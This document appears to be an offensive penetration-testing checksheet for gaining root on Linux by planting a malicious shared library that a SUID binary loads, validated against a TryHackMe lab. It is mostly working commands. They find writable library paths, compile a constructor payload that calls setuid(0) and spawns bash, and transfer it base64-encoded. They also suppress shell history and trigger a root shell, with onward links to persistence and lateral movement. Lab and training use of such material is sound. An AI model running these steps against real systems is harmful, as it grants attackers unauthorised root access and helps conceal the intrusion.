
⚠️ **Drops a malicious shared object that a SUID/SGID binary loads while running as root.** Higher IOC than a live-off-the-land technique — a compiled artefact lands on disk and a setuid binary executes it.

⚠️ **Applies only to the candidates that load a `.so` from a path you can write to** — a library missing from a writable directory, or an existing library in a writable location. Most binaries link standard libraries from root-owned paths and are not candidates.

⚠️ **SGID (not SUID) binaries yield the effective _group_, not root** — see [[#SGID candidates]].

---

## Step 1 — Self-select a candidate

⚠️ Candidate list = the SUID/SGID `find` output from [[Linux Privilege Escalation Checksheet]] `SUID / SGID binaries`. If absent, return there first.

For each candidate `<binary>`, trace the `.so` files it loads at runtime:

`timeout 10 strace -o /tmp/.t <binary> </dev/null 2>/dev/null; grep -E 'open(at)?\(.*\.so' /tmp/.t | grep -v 'ld\.so'; rm -f /tmp/.t`

(no `strace` → static fallback at the end of this step)

Each returned line is a `.so` the binary opened (or tried to); `<so_path>` = the quoted path on the line.

* Line ends `= -1 ENOENT` → library missing from `<so_path>`. Test the nearest existing parent dir: `d="$(dirname <so_path>)"; until [ -e "$d" ]; do d="$(dirname "$d")"; done; test -w "$d" && echo "WRITABLE" || echo "NOT WRITABLE"`
   * `WRITABLE` → candidate, **record `<so_path>`** → skip to Step 3.
   * `NOT WRITABLE` → ignore this line.
* Line ends in a number (e.g. `= 3`) AND `<so_path>` not under `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64` → present, non-standard location. Test: `{ test -w <so_path> || test -w "$(dirname <so_path>)"; } && echo "WRITABLE" || echo "NOT WRITABLE"`
   * `WRITABLE` → candidate, **record `<so_path>`** → Step 2.
   * `NOT WRITABLE` → ignore this line.
* Line ends in a number AND `<so_path>` under `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64` → standard library load, ignore this line.

No line on this binary yields a candidate → next candidate.
List exhausted → return to [[Linux Privilege Escalation Checksheet]] `SUID / SGID binaries` (next technique: [[SUID Environment Variables]]).

### No `strace` → static fallback

`strace` absent → inspect statically with both tools:

##### ldd

`ldd <binary>`

Prints `name => <so_path>` per linked library (if no `=>` present, `name` is `<so_path>`). A line that has `=>` but no path after it is a kernel virtual object (the vDSO) — memory-mapped, not a file → ignore. For each remaining `<so_path>` not under `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64` → `{ test -w <so_path> || test -w "$(dirname <so_path>)"; } && echo "WRITABLE" || echo "NOT WRITABLE"`
* `WRITABLE` → candidate, **record `<so_path>`** → Step 2. 
* `NOT WRITABLE` → proceed.

##### strings

`strings <binary> | grep -E '\.so' | grep '/'`

Prints one full `<so_path>` per line. For each `<so_path>` not under `/lib`, `/usr/lib`, `/lib64`, `/usr/lib64`, check whether it exists:

`test -e <so_path> && echo "EXISTS" || echo "MISSING"`
* `EXISTS` → `{ test -w <so_path> || test -w "$(dirname <so_path>)"; } && echo "WRITABLE" || echo "NOT WRITABLE"`
   * `WRITABLE` → candidate, **record `<so_path>`** → Step 2.
   * `NOT WRITABLE` → proceed.
* `MISSING` → `d="$(dirname <so_path>)"; until [ -e "$d" ]; do d="$(dirname "$d")"; done; test -w "$d" && echo "WRITABLE" || echo "NOT WRITABLE"`
   * `WRITABLE` → candidate, **record `<so_path>`** → Step 3.
   * `NOT WRITABLE` → proceed.

No `<so_path>` from either tool is writable → next candidate.
List exhausted → return to [[Linux Privilege Escalation Checksheet]] `SUID / SGID binaries` (next technique: [[SUID Environment Variables]]).

---

## Step 2 — Backup original `.so` (overwrite path only)

Preserve the legitimate library so the binary still works after cleanup. Conditional on readability:

`test -r <so_path> && cp -p <so_path> /tmp/.$(basename <so_path>).bak && echo "BACKED UP" || echo "NOT READABLE — no backup"`

- `BACKED UP` → proceed to Step 3.
- `NOT READABLE — no backup` → overwrite is destructive and unrecoverable; proceed only if acceptable.

---

## Step 3 — Build malicious `.so` and place it at `<so_path>`

### On the target machine — read the binary's arch:

`file <binary>`

* `ELF 64-bit` → `<arch_flag>` is `-m64`.
* `ELF 32-bit` → `<arch_flag>` is `-m32`.

### On the attacker machine — compile (matching the arch) and encode

Write the payload source:

`printf '%s\n' '#include <unistd.h>' '#include <stdlib.h>' 'static void init() __attribute__((constructor));' 'void init(){ setuid(0); system("/bin/bash"); }' > /tmp/.cache.c`

Compile and base64-encode:

`gcc <arch_flag> -shared -fPIC -o /tmp/.cache.so /tmp/.cache.c && base64 -w0 /tmp/.cache.so && echo`

* Base64 string printed → copy it (single line).
* `gcc` errors / no base64 string → [[#Fallback — compile on target]]

### On the target machine — history-suppressed subshell, prep path, decode in place

`HISTFILE=/dev/null bash`

`mkdir -p "$(dirname <so_path>)"; rm -f <so_path> 2>/dev/null`

Begin the heredoc:

`base64 -d <<'EOF' > <so_path>`

Prompt changes to `>`. Paste the base64 string, hit Enter. Close it:

`EOF`

### Verify

Target: `md5sum <so_path>` 
Attacker: `md5sum /tmp/.cache.so` 

* Hashes match → `.so` is byte-intact → proceed to Step 4. 
* Mismatch → paste was truncated/corrupted → re-run the heredoc.

### Fallback — compile on target

Write the same payload source to `/tmp/.cache.c` on the target:

`printf '%s\n' '#include <unistd.h>' '#include <stdlib.h>' 'static void init() __attribute__((constructor));' 'void init(){ setuid(0); system("/bin/bash"); }' > /tmp/.cache.c`

then:

`mkdir -p "$(dirname <so_path>)"; rm -f <so_path> 2>/dev/null; gcc <arch_flag> -shared -fPIC -o <so_path> /tmp/.cache.c && rm /tmp/.cache.c && echo "BUILT <so_path>"`

.......proceed to Step 4

---

## Step 4 — Trigger + verify

Run the SUID binary untraced (the constructor fires on load and spawns the shell before the binary's own logic):

`<binary>`

In the spawned shell:

`id`

- `uid=0(root)` → root achieved.
- `uid` unchanged → binary did not load `<so_path>` as expected (wrong path / arch mismatch / not actually SUID-root). Re-check Steps 1–3; if exhausted, next candidate (Step 1).
- SGID binary — `egid=<group>` set but `uid` ≠ 0 → see [[#SGID candidates]].

---
## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction → [[Linux Credential Extraction Checksheet]]
- Persistence → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---
## Cleanup

Exit the root shell first (the binary's `main()` will then resume harmlessly), then as your normal user:

**MISSING / create case (step 2 skipped)):**

`rm <so_path>`

`rmdir -p "$(dirname <so_path>)" 2>/dev/null`

**PRESENT / overwrite case (step 2 executed)** — restore the original if a backup was taken:

`cp -p /tmp/.$(basename <so_path>).bak <so_path> && rm /tmp/.$(basename <so_path>).bak`

⚠️ Execution of the setuid binary and shell spawn may be recorded by auditd / process accounting (`pacct`) if enabled. Log cleanup is out of scope.

---
## SGID candidates

For an SGID (not SUID) binary, the constructor runs with `egid=<group>`, not `euid=0`. `setuid(0)` returns `-1` with no effect — the win is the effective group, not root.

- Keep `system("/bin/bash")` to drop into a shell carrying the elevated `egid`, or replace the action with one leveraging `<group>`'s access directly.
- Verify: `id` shows the new `egid=<group>`. No `egid` change → this binary drops the setgid privilege before load; abandon it, next candidate (Step 1).
- Exploit per the group: e.g. group `shadow` → read `/etc/shadow` → [[Readable Shadow]]; `disk` / `docker` → matching group-escalation route.

---

## Validation

THM:Linux PrivEsc:Task 12 SUID / SGID Executables — Shared Object Injection